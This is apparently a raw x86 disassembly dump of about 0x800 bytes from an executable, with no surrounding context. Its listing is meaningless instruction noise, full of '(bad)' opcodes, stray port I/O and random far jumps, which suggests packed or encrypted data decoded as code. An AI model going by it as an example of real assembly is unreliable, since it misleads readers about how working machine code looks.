  413f80:	test   DWORD PTR [esi-0x373b93b],eax
  413f86:	mov    dl,0xb2
  413f88:	scas   al,BYTE PTR es:[edi]
  413f89:	adc    DWORD PTR gs:[edi+0x76a9a128],eax
  413f90:	mov    al,0x1e
  413f92:	push   ebx
  413f93:	sbb    DWORD PTR [ebx],esi
  413f95:	add    DWORD PTR ds:0x5dbc45c1,esp
  413f9b:	inc    eax
  413f9c:	pop    ecx
  413f9d:	mov    esi,0x45da421e
  413fa2:	fdiv   st,st(6)
  413fa4:	(bad)  
  413fa5:	bound  ecx,QWORD PTR [edi]
  413fa7:	mov    ch,ah
  413fa9:	cwde   
  413faa:	adc    BYTE PTR [edx],bl
  413fac:	(bad)  
  413fad:	clc    
  413fae:	(bad)  
  413fb0:	test   eax,0xd4bbd8c2
  413fb5:	bswap  esi
  413fb7:	pop    ss
  413fb8:	adc    ch,ch
  413fba:	sub    eax,0xed8c6f16
  413fbf:	in     al,0xd7
  413fc1:	push   ebp
  413fc2:	pop    esi
  413fc3:	out    0x68,eax
  413fc5:	add    eax,0xc3827654
  413fca:	fstp   QWORD PTR [eax+esi*8+0x57d0b1df]
  413fd1:	dec    ecx
  413fd2:	stos   DWORD PTR es:[edi],eax
  413fd3:	xchg   ebx,eax
  413fd4:	gs jecxz 0x414033
  413fd7:	jne    0x413ff2
  413fd9:	int3   
  413fda:	iret   
  413fdb:	pop    ds
  413fdc:	jle    0x414039
  413fde:	xor    bh,BYTE PTR [esi+0xb]
  413fe1:	into   
  413fe2:	fwait
  413fe3:	mov    edx,0x727bb145
  413fe8:	in     al,dx
  413fe9:	imul   ebx,DWORD PTR [edi+eiz*1+0x1dd4242d],0x48
  413ff1:	repz repz or cl,bh
  413ff5:	test   eax,esp
  413ff7:	fs xchg ebp,eax
  413ff9:	adc    al,0x66
  413ffb:	pop    ss
  413ffc:	pop    esp
  413ffd:	mov    edx,0x68b943d7
  414002:	arpl   cx,si
  414004:	sub    eax,0x26d24500
  414009:	inc    ebx
  41400a:	nop
  41400b:	xor    BYTE PTR [edx+0x7003c299],bh
  414011:	jmp    0xc3ee:0x3edaf310
  414018:	cmp    eax,0x4eba81a0
  41401d:	stc    
  41401e:	test   eax,0x6df90c81
  414023:	sbb    BYTE PTR [edi],0x3
  414026:	sbb    BYTE PTR [ebp+0x3e],al
  414029:	adc    eax,0xcabeeeda
  41402e:	call   0xb5c7900a
  414033:	mov    esp,DWORD PTR [edx+0xf55a900]
  414039:	cmp    BYTE PTR ds:0x4af0ef33,ch
  41403f:	mov    eax,ds:0x1730daf8
  414044:	jg     0x414072
  414046:	pop    ebp
  414047:	jbe    0x413fea
  414049:	stc    
  41404a:	pop    ecx
  41404b:	ss and edx,ebp
  41404e:	push   ds
  41404f:	in     eax,0xe2
  414051:	arpl   bx,di
  414053:	(bad)  
  414054:	leave  
  414055:	(bad)  
  414056:	lahf   
  414057:	out    0x8,eax
  414059:	jg     0x413fe8
  41405b:	cmp    al,0xb8
  41405d:	mov    dh,0xfc
  41405f:	cwde   
  414060:	out    0xa5,al
  414062:	xchg   ebp,eax
  414063:	aam    0xca
  414065:	mov    bh,0xbf
  414067:	sbb    eax,0xeda3a8ae
  41406c:	jle    0x41406f
  41406e:	shr    eax,0xb5
  414071:	and    al,0xf5
  414073:	out    dx,eax
  414074:	shl    DWORD PTR [ebp-0xb0160e0],0xb3
  41407b:	push   esi
  41407c:	push   cs
  41407d:	add    BYTE PTR [edi],dh
  41407f:	cli    
  414080:	sub    eax,0x18d9de58
  414085:	push   edx
  414086:	aam    0xdf
  414088:	inc    esp
  414089:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41408a:	ds shl al,1
  41408d:	lods   eax,DWORD PTR ds:[esi]
  41408e:	mov    esi,0x78f9dc53
  414093:	es xchg edi,eax
  414095:	in     al,dx
  414096:	clc    
  414097:	jno    0x414057
  414099:	dec    edx
  41409a:	or     edx,DWORD PTR [ebp+0x1f]
  41409d:	or     BYTE PTR [edi],dl
  41409f:	cli    
  4140a0:	dec    esi
  4140a1:	repnz mov esp,0xdefa8984
  4140a7:	adc    ebx,ecx
  4140a9:	pop    ecx
  4140aa:	inc    esp
  4140ab:	jne    0x41407e
  4140ad:	dec    edx
  4140ae:	into   
  4140af:	aas    
  4140b0:	sbb    al,0xe0
  4140b2:	and    al,dh
  4140b4:	sbb    DWORD PTR [eax+ecx*8-0x39],esp
  4140b8:	pusha  
  4140b9:	or     BYTE PTR [ebp-0x50e4f84d],0x36
  4140c0:	xor    eax,DWORD PTR [edi]
  4140c2:	sbb    al,0x59
  4140c4:	pop    ss
  4140c5:	and    al,0x3f
  4140c7:	add    BYTE PTR [eax],bh
  4140c9:	shl    DWORD PTR [edx-0x72],0xd0
  4140cd:	inc    esp
  4140ce:	lods   eax,DWORD PTR ds:[esi]
  4140cf:	adc    bh,bl
  4140d1:	lods   eax,DWORD PTR ds:[esi]
  4140d2:	dec    esp
  4140d3:	scas   al,BYTE PTR es:[edi]
  4140d4:	xchg   edx,eax
  4140d5:	mov    DWORD PTR [eax+0x15],eax
  4140d8:	mov    al,0x4
  4140da:	pop    edx
  4140db:	icebp  
  4140dc:	std    
  4140dd:	lods   al,BYTE PTR ds:[esi]
  4140de:	inc    esi
  4140df:	hlt    
  4140e0:	xchg   esp,eax
  4140e1:	pop    ds
  4140e2:	enter  0xb2b2,0x26
  4140e6:	js     0x41407f
  4140e8:	mov    ebx,0x84faac8
  4140ed:	clc    
  4140ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4140ef:	(bad)  
  4140f0:	push   ecx
  4140f1:	mov    ds:0xd948c7e6,al
  4140f6:	or     BYTE PTR [esi+0x4a3a4c69],0x77
  4140fd:	jle    0x414090
  4140ff:	pop    ebp
  414100:	jmp    0x4140d0
  414102:	mov    dh,0x15
  414104:	adc    ebx,DWORD PTR [edi-0x5f48902f]
  41410a:	sbb    esi,DWORD PTR [ecx+eiz*2]
  41410d:	add    dh,BYTE PTR [edx]
  41410f:	rcl    DWORD PTR [esi*8+0x3d001bd5],1
  414116:	mov    ecx,edi
  414118:	or     eax,0xd8058710
  41411d:	leave  
  41411e:	pop    ds
  41411f:	dec    ebp
  414120:	pop    esi
  414121:	test   eax,0xe3d19e5e
  414126:	mov    BYTE PTR [esi+0x41],ch
  414129:	sbb    eax,0x917140ba
  41412e:	push   0x58
  414130:	add    cl,BYTE PTR ds:0xf62e71f6
  414136:	jbe    0x4140f9
  414138:	adc    eax,0x6330ad00
  41413d:	jbe    0x4141aa
  41413f:	inc    edx
  414140:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414141:	mov    esi,0x883b1b1b
  414146:	dec    eax
  414147:	jbe    0x41415e
  414149:	fidivr WORD PTR cs:[edx-0x16]
  41414d:	sbb    cl,ch
  41414f:	push   eax
  414150:	dec    edi
  414151:	test   eax,0xf508a22a
  414156:	lds    edi,FWORD PTR [ecx-0x347ae56b]
  41415c:	or     BYTE PTR [edi+eax*1+0x21],cl
  414160:	in     eax,dx
  414161:	or     al,0x23
  414163:	std    
  414164:	mov    al,ds:0x82ea0eb
  414169:	sahf   
  41416a:	sub    BYTE PTR [eax-0x66],dh
  41416d:	xrelease mov DWORD PTR [edx+ebx*8+0x4d5b20a7],ebp
  414175:	popa   
  414176:	push   eax
  414177:	inc    di
  414179:	inc    edi
  41417a:	push   eax
  41417b:	cmp    cl,BYTE PTR ds:0x2fec98c1
  414181:	in     eax,0xda
  414183:	adc    al,0x56
  414185:	outs   dx,BYTE PTR ds:[esi]
  414186:	jb     0x4141eb
  414188:	mov    bl,0x25
  41418a:	lods   al,BYTE PTR ds:[esi]
  41418b:	jmp    0x4141a5
  41418d:	adc    al,0xe4
  41418f:	call   0x743b:0xc70306
  414196:	dec    ebx
  414197:	fiadd  WORD PTR ds:0x8d6b7039
  41419d:	pop    es
  41419e:	mov    dh,0xa5
  4141a0:	mov    al,0xbc
  4141a2:	mov    ds:0x9d1bec8b,al
  4141a7:	mov    eax,ds:0x5d077700
  4141ac:	sub    eax,0x80d2bde4
  4141b1:	mov    bh,0xac
  4141b3:	hlt    
  4141b4:	add    al,0xc7
  4141b6:	fidiv  WORD PTR [edi+0x4187fee1]
  4141bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4141bd:	div    bh
  4141bf:	fmul   st(4),st
  4141c1:	xor    BYTE PTR [eax+0x38],dl
  4141c4:	inc    ebx
  4141c5:	popa   
  4141c6:	in     al,dx
  4141c7:	dec    eax
  4141c8:	jge    0x4141c7
  4141ca:	or     esi,DWORD PTR ds:[edx-0x45]
  4141ce:	fsub   st,st(4)
  4141d0:	pushf  
  4141d1:	(bad)  
  4141d2:	push   0xf558f665
  4141d7:	mov    esp,0x866bb504
  4141dc:	push   ebp
  4141dd:	outs   dx,BYTE PTR ds:[esi]
  4141de:	push   edi
  4141df:	push   edx
  4141e0:	xchg   edx,eax
  4141e1:	call   0x6fa0:0xdfe8c3f6
  4141e8:	jne    0x41418d
  4141ea:	add    eax,0xe80c59a8
  4141ef:	int    0xc0
  4141f1:	mov    dh,0x7a
  4141f3:	inc    edx
  4141f4:	pop    ds
  4141f5:	mov    ecx,0x30c68638
  4141fa:	xor    BYTE PTR [ebp-0x14],ch
  4141fd:	and    ebp,DWORD PTR [eax+0x637b6b72]
  414203:	mov    BYTE PTR [edx],dl
  414205:	push   cs
  414206:	jae    0x41419d
  414208:	rol    BYTE PTR [ecx-0x4b001cb5],cl
  41420e:	fcomi  st,st(0)
  414210:	out    dx,eax
  414211:	adc    al,0x58
  414213:	xor    al,0xb8
  414215:	adc    al,0x17
  414217:	xor    cl,BYTE PTR [ecx+eax*4]
  41421a:	cmp    BYTE PTR [edi+0x6b0fe1d0],dl
  414220:	xchg   edi,eax
  414221:	cmp    eax,0x5573d3e2
  414226:	sti    
  414227:	pop    es
  414228:	fstp   QWORD PTR [ebp+0x41]
  41422b:	push   eax
  41422c:	(bad)  
  41422d:	mov    ds:0x3fd2003,al
  414232:	loopne 0x41428c
  414234:	pop    esi
  414235:	and    edx,DWORD PTR ss:[eax-0x62]
  414239:	shl    BYTE PTR [esi-0x5c],0xdf
  41423d:	push   esp
  41423e:	mov    esi,0xcb095037
  414243:	hlt    
  414244:	inc    edi
  414245:	sar    BYTE PTR [edx],1
  414247:	in     eax,dx
  414248:	mov    eax,0x9db037bb
  41424d:	lods   al,BYTE PTR ds:[esi]
  41424e:	js     0x414273
  414250:	mov    bh,0xaf
  414252:	mov    al,0x30
  414254:	nop
  414255:	sti    
  414256:	dec    esi
  414257:	sbb    al,0xc9
  414259:	cld    
  41425a:	push   ebp
  41425b:	fst    DWORD PTR ds:0xfc8a867b
  414261:	mov    esp,0xee0dea5d
  414266:	pop    ebp
  414267:	xchg   BYTE PTR fs:[esi+0x3a],ah
  41426b:	xor    al,0x89
  41426d:	dec    edx
  41426e:	jb     0x414245
  414270:	mov    al,0xc9
  414272:	add    ecx,edi
  414274:	adc    eax,0x5d32eef1
  414279:	pop    edi
  41427a:	pop    edx
  41427b:	rcr    DWORD PTR [ebx-0x4e],0xff
  41427f:	push   ecx
  414280:	xchg   ebx,eax
  414281:	clc    
  414282:	sti    
  414283:	adc    BYTE PTR [ecx-0x52],0xd
  414287:	ret    0x628
  41428a:	adc    ah,BYTE PTR [edx-0x79]
  41428d:	sahf   
  41428e:	(bad)
  414292:	nop
  414293:	jge    0x414266
  414295:	(bad)  
  414296:	sbb    dl,BYTE PTR [ebp-0x3e67e7f8]
  41429c:	test   DWORD PTR [eax+ecx*2+0x2],0x695a556
  4142a4:	push   ecx
  4142a5:	scas   al,BYTE PTR es:[edi]
  4142a6:	mov    ebx,0xd84b401f
  4142ab:	test   al,0x34
  4142ad:	sub    DWORD PTR [edx+ecx*2+0x5b],esp
  4142b1:	or     ecx,DWORD PTR [eax-0x7b6bb8c6]
  4142b7:	fistp  WORD PTR [ecx-0x1ecf2a34]
  4142bd:	adc    al,0x34
  4142bf:	call   0xd76474e3
  4142c4:	xchg   ebp,eax
  4142c5:	stc    
  4142c6:	xor    al,0x30
  4142c8:	lods   al,BYTE PTR ds:[esi]
  4142c9:	mov    eax,0x48fa0d6c
  4142ce:	sar    BYTE PTR [eax],1
  4142d0:	je     0x4142ac
  4142d2:	push   es
  4142d3:	or     edi,edx
  4142d5:	jae    0x41427f
  4142d7:	rcl    DWORD PTR [esp+edi*8],1
  4142da:	shl    BYTE PTR [edi],0x4c
  4142dd:	sub    ch,ah
  4142df:	into   
  4142e0:	inc    edi
  4142e1:	jno    0x414339
  4142e3:	jb     0x4142b3
  4142e5:	xchg   DWORD PTR [ecx+0x13],esp
  4142e8:	sub    BYTE PTR [eax-0x32ebfb0c],dl
  4142ee:	push   ds
  4142ef:	xor    eax,0xc75deab5
  4142f4:	je     0x4142cf
  4142f6:	enter  0x7658,0xe4
  4142fa:	stc    
  4142fb:	adc    eax,0xd9b82c0d
  414300:	sbb    eax,0xd1ae527e
  414305:	enter  0x718d,0xe2
  414309:	sub    edx,edi
  41430b:	jp     0x414294
  41430d:	adc    DWORD PTR ds:0xe2f74714,edi
  414313:	xor    eax,0x95530daf
  414318:	outs   dx,DWORD PTR ds:[esi]
  414319:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41431a:	xor    DWORD PTR [ebx],esi
  41431c:	inc    ebp
  41431d:	jle    0x414372
  41431f:	sbb    al,0xaa
  414321:	out    dx,eax
  414322:	sub    bh,ah
  414324:	push   0xffffff97
  414326:	add    al,0x7d
  414328:	je     0x414380
  41432a:	cmp    eax,0x9ef1c7dd
  41432f:	sbb    esp,DWORD PTR ds:0xd79b8964
  414335:	mov    al,ds:0x38b6c4ad
  41433a:	fnstenv [eax]
  41433c:	test   DWORD PTR [ecx+ebx*8+0xa],edi
  414340:	into   
  414341:	adc    BYTE PTR [ebx],0xcd
  414344:	aam    0x4b
  414346:	loopne 0x41437f
  414348:	imul   edi,DWORD PTR [ebp-0x35b5b952],0xffffffb3
  41434f:	int3   
  414350:	fnstsw WORD PTR [ecx+0x391e4ab9]
  414356:	inc    esi
  414357:	(bad)  
  414359:	push   0x95d63c31
  41435e:	ss test BYTE PTR fs:[ebp+0x37c3c7df],al
  414366:	in     eax,dx
  414367:	dec    ebp
  414368:	pop    ebx
  414369:	je     0x414391
  41436b:	aam    0x52
  41436d:	mov    DWORD PTR [ebx+0x61c78bcb],esp
  414373:	or     eax,0xb0c4a1f5
  414378:	dec    ebp
  414379:	sar    dl,1
  41437b:	and    edi,0xd04277de
  414381:	push   cs
  414382:	leave  
  414383:	enter  0xa127,0x51
  414387:	jmp    0x52dcd178
  41438c:	inc    ebx
  41438d:	adc    al,0xa7
  41438f:	xchg   edi,eax
  414390:	icebp  
  414391:	sub    bl,BYTE PTR [esi+0x6f201687]
  414397:	jno    0x4143ef
  414399:	cli    
  41439a:	dec    edx
  41439b:	jp     0x414328
  41439d:	data16 mov bl,0x86
  4143a0:	fwait
  4143a1:	and    al,0x18
  4143a3:	sub    eax,0x189fc878
  4143a8:	dec    edi
  4143a9:	clc    
  4143aa:	(bad)  
  4143ab:	in     eax,dx
  4143ac:	jecxz  0x41434d
  4143ae:	pop    eax
  4143af:	pop    esp
  4143b0:	fnsave [eax+0xc04908c]
  4143b6:	sbb    eax,0x78cd6bb3
  4143bb:	cdq    
  4143bc:	loope  0x414393
  4143be:	adc    BYTE PTR [ebx+esi*8-0x19],bl
  4143c2:	mov    ds:0x43603a93,eax
  4143c7:	sahf   
  4143c8:	stc    
  4143c9:	pusha  
  4143ca:	or     eax,0x4b7f77bd
  4143cf:	xchg   esi,edi
  4143d1:	mov    dh,bh
  4143d3:	iret   
  4143d4:	icebp  
  4143d5:	lock mov bh,0x86
  4143d8:	fld    DWORD PTR [esi-0x114c8711]
  4143de:	dec    ebp
  4143df:	jmp    0x414418
  4143e1:	ins    BYTE PTR es:[edi],dx
  4143e2:	faddp  st(4),st
  4143e4:	xor    eax,0xd8f4ff90
  4143e9:	xchg   ebx,eax
  4143ea:	and    DWORD PTR [edx],0x5753e808
  4143f0:	data16 cmc 
  4143f2:	jmp    DWORD PTR gs:[edx+0x15]
  4143f6:	mov    ch,0xb2
  4143f8:	sub    esi,DWORD PTR [edx-0x7beb6237]
  4143fe:	ret    
  4143ff:	jg     0x41442a
  414401:	push   edi
  414402:	pop    ebx
  414403:	mov    esi,0x22dda074
  414408:	lods   al,BYTE PTR ds:[esi]
  414409:	inc    ecx
  41440a:	into   
  41440b:	or     al,0x64
  41440d:	inc    ebp
  41440e:	out    0x77,al
  414410:	fistp  QWORD PTR [esi-0x48]
  414413:	xor    edx,eax
  414415:	psubusw mm7,QWORD PTR [ebx]
  414418:	and    BYTE PTR [ebx-0x1372ddf0],ah
  41441e:	mov    ah,0xe8
  414420:	dec    edi
  414421:	xor    al,0x2
  414423:	js     0x414444
  414425:	fisttp QWORD PTR [ebp-0x69d95512]
  41442b:	xchg   edx,eax
  41442c:	add    esp,DWORD PTR [edx+0x5f]
  41442f:	in     al,dx
  414430:	(bad)  
  414431:	neg    ah
  414433:	cbw    
  414435:	dec    ebp
  414436:	mov    cl,0x50
  414438:	jp     0x4143ba
  41443a:	push   ds
  41443b:	cmp    al,0x3c
  41443d:	dec    esp
  41443e:	push   0x5167b360
  414443:	xor    al,0x33
  414445:	call   DWORD PTR [edi-0x5d]
  414448:	mov    ss,WORD PTR [esi+esi*2-0x47513ab9]
  41444f:	mov    ds:0xfe4b74b8,al
  414454:	xchg   edi,eax
  414455:	dec    esi
  414456:	mov    ebx,0x3f8091c9
  41445b:	push   eax
  41445c:	pop    ds
  41445d:	leave  
  41445e:	mov    bh,0xea
  414460:	add    BYTE PTR [ecx+ecx*1+0x4e],0x18
  414465:	pop    eax
  414466:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414467:	ins    DWORD PTR es:[edi],dx
  414468:	test   DWORD PTR [edx-0x7fa3c9e2],edi
  41446e:	into   
  41446f:	aas    
  414470:	repnz pop ss
  414472:	xor    BYTE PTR [eax+0x3f5d982c],ch
  414478:	push   0xb5f66a61
  41447d:	sar    BYTE PTR [edi],1
  41447f:	aaa    
  414480:	jge    0x41443d
  414482:	jge    0x4144cf
  414484:	ins    DWORD PTR es:[edi],dx
  414485:	leave  
  414486:	lock fdivr DWORD PTR [ebx+eax*1+0x4b]
  41448b:	sub    al,0x9c
  41448d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41448e:	lea    ecx,[edi+ebp*1]
  414491:	scas   eax,DWORD PTR es:[edi]
  414492:	jne    0x4144e4
  414494:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414495:	cmp    eax,0xf509ebda
  41449a:	add    al,BYTE PTR [ebx-0x4ad6c0e8]
  4144a0:	adc    DWORD PTR [ecx+0x649b7cda],ebp
  4144a6:	jne    0x4144f9
  4144a8:	fisubr WORD PTR [ebp-0x5f]
  4144ab:	ror    DWORD PTR [edi+0x4d],1
  4144ae:	rcl    DWORD PTR gs:[esi],0xf
  4144b2:	xor    bh,cl
  4144b4:	push   ss
  4144b5:	sub    al,0x26
  4144b7:	adc    eax,DWORD PTR [eax+0x46]
  4144ba:	cmp    eax,0x43321c33
  4144bf:	fst    DWORD PTR [edx-0x40]
  4144c2:	cwde   
  4144c3:	mov    edi,0x51505f81
  4144c8:	xor    DWORD PTR [ebx],ecx
  4144ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4144cb:	xchg   edi,eax
  4144cc:	mov    ebx,0xe5ee382a
  4144d1:	popf   
  4144d2:	adc    cl,BYTE PTR [edi]
  4144d4:	aaa    
  4144d5:	aad    0xc4
  4144d7:	add    BYTE PTR [ebx],0xa9
  4144da:	fnstenv [edi-0x4a]
  4144dd:	test   BYTE PTR [esi],cl
  4144df:	push   0x69
  4144e1:	xor    ecx,DWORD PTR [ebx]
  4144e3:	cmp    ebx,ebx
  4144e5:	scas   eax,DWORD PTR es:[edi]
  4144e6:	popf   
  4144e7:	push   esp
  4144e8:	ss ins DWORD PTR es:[edi],dx
  4144ea:	cwde   
  4144eb:	adc    ebp,DWORD PTR [edx+0x29]
  4144ee:	das    
  4144ef:	icebp  
  4144f0:	aad    0x49
  4144f2:	(bad)  
  4144f3:	(bad)  
  4144f5:	in     eax,dx
  4144f6:	bound  ebp,QWORD PTR ds:0xd49e9fbf
  4144fc:	xchg   esi,eax
  4144fd:	js     0x414544
  4144ff:	adc    ebx,esp
  414501:	addr16 ja 0x414565
  414504:	pop    edi
  414505:	add    ecx,DWORD PTR [edi+edx*1-0x30]
  414509:	(bad)  
  41450b:	add    eax,0xdaa285ad
  414510:	push   ss
  414511:	arpl   dx,sp
  414513:	jbe    0x4144b7
  414515:	ret    0xb45e
  414518:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414519:	adc    al,0x54
  41451b:	scas   eax,DWORD PTR es:[edi]
  41451c:	cld    
  41451d:	jne    0x414519
  41451f:	jbe    0x4144fa
  414521:	loop   0x4144ba
  414523:	ins    BYTE PTR es:[edi],dx
  414524:	repnz add ch,BYTE PTR ds:0x556d31a3
  41452b:	clc    
  41452c:	lods   al,BYTE PTR ds:[esi]
  41452d:	retf   
  41452e:	addr16 clc 
  414530:	or     al,0x9
  414532:	add    dl,BYTE PTR [ebx-0x6a784f66]
  414538:	sbb    al,BYTE PTR [ebp+0x54]
  41453b:	xchg   DWORD PTR [edx],esp
  41453d:	gs dec edx
  41453f:	xchg   edi,eax
  414540:	loope  0x414599
  414542:	int3   
  414543:	sub    BYTE PTR [ecx-0x5e08851b],bl
  414549:	sbb    eax,0x757813d3
  41454e:	call   0x5356fd9c
  414553:	les    esi,FWORD PTR [edi-0x7e]
  414556:	mov    ch,bl
  414558:	jno    0x41456c
  41455a:	aas    
  41455b:	clc    
  41455c:	and    cl,BYTE PTR [edi]
  41455e:	mov    ds:0x3b4d7853,al
  414563:	je     0x4144ef
  414565:	in     eax,dx
  414566:	adc    DWORD PTR [edx+0x10807a4c],edi
  41456c:	ret    0xd194
  41456f:	fnstsw WORD PTR [ebx+0x59f01fe1]
  414575:	icebp  
  414576:	pop    edi
  414577:	xor    al,0x32
  414579:	add    BYTE PTR [edi+0x7051b68e],0x39
  414580:	push   cs
  414581:	pop    ecx
  414582:	cmp    eax,0xfd0d4b0e
  414587:	dec    ecx
  414588:	mov    dl,0x4e
  41458a:	fwait
  41458b:	clc    
  41458c:	in     eax,dx
  41458d:	adc    DWORD PTR [eax+0x7c],esi
  414590:	je     0x41456a
  414592:	mov    bl,0x3d
  414594:	mov    ebx,0xe2ab7cc6
  414599:	push   ds
  41459a:	inc    edi
  41459b:	cmp    BYTE PTR [ebx],0xc4
  41459e:	xlat   BYTE PTR ds:[ebx]
  41459f:	xchg   ebp,eax
  4145a0:	je     0x414546
  4145a2:	dec    eax
  4145a3:	in     eax,0xeb
  4145a5:	mov    ebp,0xf8dff06f
  4145aa:	(bad)  
  4145ab:	adc    eax,0xc36ccb2c
  4145b0:	mov    ebx,0x4b78375b
  4145b5:	loop   0x4145da
  4145b7:	mov    ah,0xc8
  4145b9:	outs   dx,DWORD PTR ds:[esi]
  4145ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4145bb:	in     eax,0x5f
  4145bd:	jle    0x4145fd
  4145bf:	cmp    ah,BYTE PTR [edi]
  4145c1:	cmp    al,0x63
  4145c3:	pop    ebx
  4145c4:	and    ah,ah
  4145c6:	push   ebp
  4145c7:	add    edi,DWORD PTR [edx+eiz*8]
  4145ca:	call   0xee56:0x69389b05
  4145d1:	xchg   edx,eax
  4145d2:	retf   0xdf51
  4145d5:	cs daa 
  4145d7:	inc    eax
  4145d8:	mov    ecx,0x9d3f24a0
  4145dd:	int    0xf8
  4145df:	or     DWORD PTR [edi+0x3b],ebx
  4145e2:	dec    ecx
  4145e3:	mov    eax,edx
  4145e5:	mov    ecx,0x64918c79
  4145ea:	mov    ch,0x39
  4145ec:	inc    esi
  4145ed:	outs   dx,BYTE PTR ds:[esi]
  4145ee:	mov    dh,0xf
  4145f0:	mov    esi,eax
  4145f2:	inc    ebp
  4145f3:	data16 sahf 
  4145f5:	xchg   ecx,eax
  4145f6:	push   edi
  4145f7:	xor    eax,0xa3167fa6
  4145fc:	leave  
  4145fd:	dec    ecx
  4145fe:	mov    ch,0x56
  414600:	add    esp,esp
  414602:	neg    DWORD PTR [ebp-0x1764a584]
  414608:	jo     0x4145bb
  41460a:	loop   0x414608
  41460c:	mov    dl,0x9a
  41460f:	mov    esp,0x32e8f133
  414614:	daa    
  414615:	nop
  414616:	fst    DWORD PTR [ebx+0x4ffe663b]
  41461c:	scas   al,BYTE PTR es:[edi]
  41461d:	lock mov edx,0xfb154836
  414623:	loop   0x414634
  414625:	or     eax,0x969d38bf
  41462a:	pop    esp
  41462b:	stos   BYTE PTR es:[edi],al
  41462c:	and    ebp,DWORD PTR [esi]
  41462e:	or     ebx,ebp
  414630:	or     BYTE PTR [ecx+ebp*8],dh
  414633:	addr16 (bad) 
  414635:	outs   dx,BYTE PTR ds:[esi]
  414636:	pop    ebx
  414637:	mov    ebx,0x874be989
  41463c:	(bad)  
  41463d:	push   edx
  41463e:	aaa    
  41463f:	addr16 loopne 0x4146ac
  414642:	lds    edx,FWORD PTR [esi+0x7f]
  414645:	jb     0x414647
  414647:	inc    eax
  414648:	je     0x4145e8
  41464a:	push   ss
  41464b:	push   ebx
  41464c:	sti    
  41464d:	push   edx
  41464e:	push   0xffffff88
  414650:	popf   
  414651:	mov    al,0xec
  414653:	data16 out dx,al
  414655:	bound  eax,QWORD PTR [ebp+0x76c9fe80]
  41465b:	das    
  41465c:	rcl    BYTE PTR [ebx-0x25],0xfc
  414660:	mov    ebp,0x60c03787
  414665:	stos   BYTE PTR es:[edi],al
  414666:	or     edx,DWORD PTR [ebx-0x29]
  414669:	iret   
  41466a:	or     edx,DWORD PTR [ebx]
  41466c:	mov    ebp,0x94bdc568
  414671:	mov    ds:0x1317ed74,eax
  414676:	aad    0xb9
  414678:	add    bh,ah
  41467a:	jg     0x414659
  41467c:	jo     0x41463c
  41467e:	push   cs
  41467f:	xor    eax,DWORD PTR [ebx+0xe26fe6e]
  414685:	and    eax,0x2dcc4d8b
  41468a:	cmp    eax,0xb9f28e90
  41468f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414690:	mov    dh,dl
  414692:	sub    cl,dl
  414694:	cld    
  414695:	inc    edx
  414696:	inc    ecx
  414697:	lods   al,BYTE PTR ds:[esi]
  414698:	into   
  414699:	xchg   esi,eax
  41469a:	pop    ss
  41469b:	popf   
  41469c:	jae    0x414718
  41469e:	js     0x4146b0
  4146a0:	cmp    al,0x13
  4146a2:	push   ds
  4146a3:	lds    ecx,FWORD PTR [ebp-0x64]
  4146a6:	cs pop esp
  4146a8:	xchg   cl,bh
  4146aa:	cmp    al,dl
  4146ac:	or     DWORD PTR [ebx],0xffffffd0
  4146af:	push   edi
  4146b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4146b1:	scas   eax,DWORD PTR es:[edi]
  4146b2:	sti    
  4146b3:	xor    ebp,DWORD PTR [edx-0x69]
  4146b6:	mov    ebx,esp
  4146b8:	popf   
  4146b9:	call   0x753e:0x1fa61ed5
  4146c0:	mov    ch,0xd1
  4146c2:	pop    eax
  4146c3:	inc    eax
  4146c4:	jnp    0x414708
  4146c6:	pushf  
  4146c7:	adc    BYTE PTR [eax-0x4f1ff834],bl
  4146cd:	aam    0x6d
  4146cf:	or     eax,0x81e65d1c
  4146d4:	daa    
  4146d5:	sbb    eax,0x5dfbe556
  4146da:	jae    0x4146cc
  4146dc:	xchg   esp,eax
  4146dd:	or     BYTE PTR [edx-0x10],bl
  4146e0:	pusha  
  4146e1:	xchg   ebx,eax
  4146e2:	in     al,0xa9
  4146e4:	into   
  4146e5:	sub    eax,0xb65cd90c
  4146ea:	(bad)  
  4146eb:	xchg   ecx,eax
  4146ec:	cmp    bl,BYTE PTR [ebp+0x13]
  4146ef:	jge    0x4146ff
  4146f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4146f2:	sbb    ecx,DWORD PTR [eax+0x3b5f1dcf]
  4146f8:	adc    dh,BYTE PTR [ebx]
  4146fa:	call   0x692a62f4
  4146ff:	lods   al,BYTE PTR ds:[esi]
  414700:	inc    ecx
  414701:	in     al,0xa
  414703:	(bad)  
  414705:	add    BYTE PTR [edx-0x8],ch
  414708:	inc    edi
  414709:	adc    DWORD PTR [eax-0x6322504c],ecx
  41470f:	sbb    al,0x93
  414711:	mov    esp,0xac1a5de0
  414716:	jnp    0x41469a
  414718:	mov    ch,0xc
  41471a:	and    BYTE PTR [edi],al
  41471c:	nop
  41471d:	jmp    0x7449:0xabd88ced
  414724:	inc    ebp
  414725:	shl    DWORD PTR [ebx-0xa],cl
  414728:	jno    0x4146d5
  41472a:	inc    ebp
  41472b:	retf   
  41472c:	jae    0x41472c
  41472e:	mov    ebp,0x8a20468f
  414733:	(bad)  
  414734:	lods   eax,DWORD PTR ds:[esi]
  414735:	in     eax,dx
  414736:	jb     0x414728
  414738:	fcmovnu st,st(4)
  41473a:	iret   
  41473b:	mov    ds:0x366246d8,al
  414740:	into   
  414741:	sub    bl,BYTE PTR [eax+ebx*1-0x6e608ca8]
  414748:	mov    eax,esp
  41474a:	test   al,0x5e
  41474c:	xchg   BYTE PTR [ecx+0x5b],dl
  41474f:	xchg   ecx,eax
  414750:	jno    0x41470a
  414752:	ins    DWORD PTR es:[edi],dx
  414753:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414754:	imul   ecx,ebx,0xfffffffe
  414757:	into   
